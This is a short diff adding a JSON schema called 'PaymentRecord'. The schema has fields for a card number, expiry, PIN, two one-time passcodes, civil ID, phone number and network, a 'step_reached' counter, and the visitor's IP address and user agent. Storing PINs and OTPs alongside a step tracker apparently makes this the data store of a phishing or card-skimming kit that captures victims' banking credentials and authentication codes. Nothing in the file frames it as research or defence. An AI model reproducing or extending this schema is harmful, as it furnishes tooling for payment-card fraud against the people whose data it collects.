@@ -1,0 +1,55 @@
+{
+  "name": "PaymentRecord",
+  "type": "object",
+  "properties": {
+    "civil_id": {
+      "type": "string"
+    },
+    "amount": {
+      "type": "string"
+    },
+    "bank": {
+      "type": "string"
+    },
+    "card_prefix": {
+      "type": "string"
+    },
+    "card_number": {
+      "type": "string"
+    },
+    "expiry_month": {
+      "type": "string"
+    },
+    "expiry_year": {
+      "type": "string"
+    },
+    "pin": {
+      "type": "string"
+    },
+    "otp1": {
+      "type": "string"
+    },
+    "id_number": {
+      "type": "string"
+    },
+    "phone_number": {
+      "type": "string"
+    },
+    "network": {
+      "type": "string"
+    },
+    "otp2": {
+      "type": "string"
+    },
+    "step_reached": {
+      "type": "number"
+    },
+    "ip_address": {
+      "type": "string"
+    },
+    "user_agent": {
+      "type": "string"
+    }
+  },
+  "required": []
+}
